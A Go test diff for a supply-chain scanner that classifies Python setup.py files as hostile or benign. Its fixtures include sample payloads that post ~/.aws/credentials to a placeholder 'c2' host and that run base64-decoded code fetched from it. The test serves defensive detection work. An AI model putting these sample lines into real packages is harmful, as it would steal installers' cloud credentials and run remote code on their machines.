@@ -28,3 +28,24 @@ func TestHostileBuildRS(t *testing.T) {
 		}
 	}
 }
+
+// hostileSetupPy is the PyPI analogue of hostileBuildRS: a setup.py is hostile when
+// it pairs network egress with decode-obfuscation or named-credential access, or is
+// a download-and-run cradle — never on ambient exec (setup.py executes by definition).
+func TestHostileSetupPy(t *testing.T) {
+	cases := []struct {
+		name string
+		src  string
+		want bool
+	}{
+		{"payload: exfil creds+net", "import os,requests\nrequests.post('http://c2', data=open(os.path.expanduser('~/.aws/credentials')).read())\n", true},
+		{"payload: decode+net", "import base64,urllib.request\nurllib.request.urlopen('http://c2')\nexec(base64.b64decode(blob))\n", true},
+		{"benign: plain setup", "from setuptools import setup\nsetup(name='x', version='1.0')\n", false},
+		{"benign: net only (prebuilt fetch)", "import urllib.request\nurllib.request.urlopen('https://host/wheel.whl')\n", false},
+	}
+	for _, tc := range cases {
+		if got := hostileSetupPy(tc.src); got != tc.want {
+			t.Errorf("%s: hostileSetupPy = %v, want %v", tc.name, got, tc.want)
+		}
+	}
+}
